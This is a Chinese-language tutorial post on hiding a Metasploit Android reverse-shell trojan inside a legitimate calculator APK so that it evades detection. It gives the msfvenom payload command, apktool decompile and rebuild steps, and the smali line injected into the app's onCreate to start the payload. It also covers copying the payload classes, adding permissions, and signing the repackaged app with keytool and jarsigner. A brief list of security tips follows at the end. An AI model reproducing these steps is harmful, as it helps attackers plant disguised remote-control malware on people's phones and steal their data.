## 前言

上一篇文章我们,了解了`msfvenom`是可以对一些操作系统生成木马文件,但是这个这个文件的意图较为明显在手机上直接可以看到,因为生成的木马文件较小完全可以依附在一个较为正常的软件当中,那么今天我们看看如何制作将木马依附在正常软件中(免杀)

## 环境搭建

我们可以到[apktool官方安装说明](https://ibotpeaches.github.io/Apktool/install/)按照文章来安装和下载所需文件,如果打不开的可以按照我的步骤来
首先我们需要jdk8以上的一个Java环境(Kali自带)
我们可以使用`java -version`来查看我们java的一个版本情况(必须返回1.8以上版本)
下载apktools和apktools.java文件并且将他们放到`/usr/local/bin`目录下
使用`apktool`命令有返回输出说明apktool安装成功

## 生成木马文件并解包
生成木马apk文件
```shell 
msfvenom -p android/meterpreter/reverse_tcp LHOST=本机IP  LPORT=监听端口号 R > a.apk
```
反编译apk文件(将事先准备的apk文件也反编译了)
```shell
apktool d /root/a.apk
apktool d /root/b.apk
```
![]()

## 编辑代码

打开正常的apk解包文件夹中的的AndroidManifest.xml文件中查找Main和Launch关键词，定位到所对应的启动smail文件

![]()

好了，直接找到`/b/smali/com/meizu/flyme/calculator/CalculatorApplication.smali`文件,终于到关键时候了，我们要在计算器启动的activety中添加启动木马的代码。
打开`CalculatorApplication.smali`

![]()

直接搜索`onCreat`函数，找到`bundle`对象，你并在下面添加启动payload代码：
```java
invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V
```

![]()

点击保存之后呢，我们还要把刚才反编译的木马文件中的smail代码复制过来，把木马(a)文件夹的smail/com/metasploit文件复制到计算器(b)的smail/com/目录下。

![]()

接下来呢，我们还有一个问题，就是权限的问题，木马作为监听程序，肯定少不了有很多权限，而计算器作为一个简单的工具，权限肯定很少，因此要想使监听功能更齐全，我们有必要补充一下权限。

![]()

现在保存退出，剩下的就是回编译签名了。

## 编译签名

编译
```shell
apktool b /root/桌面/b
```
生成KEYSTORE
```shell
keytool -genkey -v -keystore mykey.keystore -alias alias_name -keyalg RSA -keysize 1024 -validity 22222
```


这里需要记住你生成的密钥

签名
```shell
jarsigner -keystore 生成的.keystore文件路径 xx.apk文件 alias_name -sigalg MD5withRSA -digestalg SHA1
```

终于完工了,现在就可以把签名好的apk文件安装到手机上,然后利用msf监听上线就好了

## 安全建议
* 安装正版软件不要使用破解版
* 下载软件时去正规渠道的应用商店
* 安装时注意apk的签名文件
* 不使用类似于`核心破解`这类软件
* 严格控制应用程序的各个权限